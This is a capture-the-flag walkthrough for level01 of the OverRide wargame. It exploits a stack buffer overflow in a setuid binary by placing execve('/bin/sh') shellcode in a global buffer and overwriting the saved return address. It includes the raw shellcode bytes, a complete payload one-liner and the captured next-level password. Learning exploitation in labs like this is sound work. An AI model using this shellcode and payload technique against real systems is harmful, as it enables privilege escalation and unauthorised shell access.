# Level 01

## Base analysis

As always, let's start by inspecting the binary's protections. We use `checksec` (or `pwn checksec`) on the file :

```
level01@OverRide:~$ checksec --file ./level01
RELRO           STACK CANARY      NX            PIE       RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE    No RPATH   No RUNPATH   /home/users/level01/level01
```

Two things immediately stand out :

- **No stack canary** : there's no guard value protecting the saved return address, so we can overflow the stack without tripping any detection.
- **NX disabled** : the stack is executable. This is the big one. When NX (No-eXecute) is enabled, code placed on the stack cannot run. With it disabled, we are free to put our own machine code somewhere in memory and jump to it.

On top of that, there's no PIE and no effective ASLR, which means addresses are **stable** between runs. We can hardcode them in our exploit.

This combination (executable memory + no canary + predictable addresses) is the textbook setup for a classic **shellcode injection via buffer overflow**. Notably, unlike Level00, this binary contains **no call to `/bin/sh`** that we could simply redirect to. We'll have to bring our own shell, in the form of **shellcode**.

## Reverse engineering

Loading the binary into Ghidra and reading `main`, the program performs two reads :

```c
fgets(obj.a_user_name, 0x100, 0)   // reads the username into a GLOBAL buffer (256 bytes of room)
fgets(buffer, 0x64, 0)             // reads the password into a LOCAL stack buffer
```

### The username read (secure)

The first `fgets()` reads up to `0x100` (256) bytes into a **global** variable that has 256 bytes reserved for it. Reading at most 256 bytes into a 256-byte buffer is safe : no overflow possible here.

After this read, `verify_user_name()` compares the **first 7 characters** of our input against the string `"dat_wil"`. If they don't match, the program stops. So our username input must start with `dat_wil` to proceed.

### The password read (vulnerable)

The second `fgets()` reads up to `0x64` (**100**) bytes into a **local** buffer that lives on `main`'s stack frame. The problem : the buffer reserved on the stack is **smaller than 100 bytes**. By supplying a long enough password, we write past the end of the buffer and into the rest of the stack frame, eventually overwriting the **saved EIP** (the return address). This is our **buffer overflow**.

## Finding the offset

To overwrite the return address precisely, we first need to know **where** in our input the saved EIP sits. We use a non-repeating cyclic pattern (here from [Wiremask's generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)) as the password, run the binary under `gdb`, and look at what address the program crashes on :

```bash
(gdb) r
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....
Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...
Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

The faulting address `0x37634136` is the value that got loaded into EIP — that is, the 4 bytes of our pattern that landed exactly on the saved return address. Read as ASCII bytes, `0x37 0x63 0x41 0x36` is `7cA6`; because the CPU is **little-endian**, those bytes were stored in memory as `6Ac7`. Looking up that sequence in the pattern tells us the offset :

```
offset: 80
```

So our overflow payload is structured as : **80 bytes of padding**, followed by the **4 bytes** that overwrite the saved EIP.

## Strategy : where to put the shellcode

Our shellcode is a standard 21-byte x86 `execve("/bin/sh")` stub :

```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

We *could* try to cram it into the password buffer, but it's small and cramped. The cleaner approach is to exploit the fact that the **first (global) buffer** has 256 bytes of room. We place our shellcode there, right after `dat_wil`, and then make the saved EIP point to it.

The global username buffer lives at the fixed address `0x0804a040`. Since the first 7 bytes are taken up by `dat_wil`, our shellcode starts 7 bytes later :

```
0x0804a040 + 7 = 0x0804a047
```

That's the address we'll write over the saved EIP. Because there's no PIE and no ASLR, this address is reliable across runs.

## Building the exploit

We craft the payload with Python and pipe it into the binary :

```bash
python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac' + '\x08\x04\xa0\x47'[::-1]" > /tmp/inj01
```

Breaking down the payload :

1. `dat_wil` — satisfies `verify_user_name()`.
2. The **shellcode** — placed in the global buffer, so it sits at `0x0804a047`.
3. `\n` — the newline that terminates the **first** `fgets()` (the username) and lets the program advance to the password prompt.
4. `Aa0...Ac` — exactly **80 bytes** of padding, filling the password buffer up to the saved EIP.
5. `'\x08\x04\xa0\x47'[::-1]` — the address `0x0804a047`, byte-reversed (`[::-1]`) to **little-endian**, which overwrites the saved EIP and redirects execution to our shellcode.

## Getting the shell

```bash
cat /tmp/inj01 - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....
Enter Password:
nope, incorrect password...
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

The trick here is `cat /tmp/inj01 - | ...`. The `-` keeps **stdin open** on the terminal after the file's content has been fed in. Without it, the spawned shell would immediately receive EOF and exit before we could type anything. With it, the shell stays interactive. The `"nope, incorrect password..."` message is expected — the password check fails, but by then the return address is already overwritten, so when `main` returns it jumps straight into our shellcode and spawns a shell.

Since the binary is setuid `level02`, that shell runs with `level02`'s privileges, letting us read the next level's password :

```
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

Level 01, clear... Progress to next level ? (Y/n) : ___
